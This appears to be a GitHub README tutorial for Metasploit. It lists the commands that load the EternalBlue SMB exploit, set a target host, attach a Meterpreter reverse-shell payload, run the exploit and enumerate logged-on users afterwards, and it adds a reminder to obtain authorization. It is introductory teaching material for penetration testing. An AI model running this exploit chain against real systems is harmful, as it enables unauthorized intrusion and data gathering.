# Metasploit Tutorial

## 🚀 Introduction

**Metasploit** is one of the most popular penetration testing frameworks, allowing you to execute a variety of exploits against remote targets. It contains a massive collection of exploits, payloads, and auxiliary modules for ethical hacking purposes.

## Author

Made by [Ghaithrb](https://github.com/ghaithrb)

## 📦 Features

- **Exploit Modules**: Use predefined exploits to attack vulnerable systems.
- **Payloads**: Run code on the target machine after exploiting a vulnerability.
- **Post-Exploitation**: Collect valuable data from compromised machines.
- **Auxiliary Modules**: Perform scans, fuzzers, and other operations.

## 🔧 How to Use Metasploit

### Starting Metasploit

```bash
msfconsole
```

#### Search for Exploits

```bash
search smb
```

#### Use an Exploit

```bash
use exploit/windows/smb/ms17_010_eternalblue
```

#### Set the Target

```bash
set RHOSTS 192.168.1.10
```

#### Set Payload

```bash
set PAYLOAD windows/x64/meterpreter/reverse_tcp
```

#### Run the Exploit

```bash
exploit
```

#### Post-Exploitation

After exploiting a system, you can run post-exploitation modules to gather more information.

```bash
post/windows/gather/enum_logged_on_users
```

## 🛡️ Best Practices

- Always ensure you have authorization before using Metasploit on a target.
- Combine Metasploit with other tools like Nmap for comprehensive penetration testing.
- Regularly update Metasploit to stay current with the latest exploits.

## 📄 License

This tutorial is licensed under the MIT License. See the LICENSE file for details.
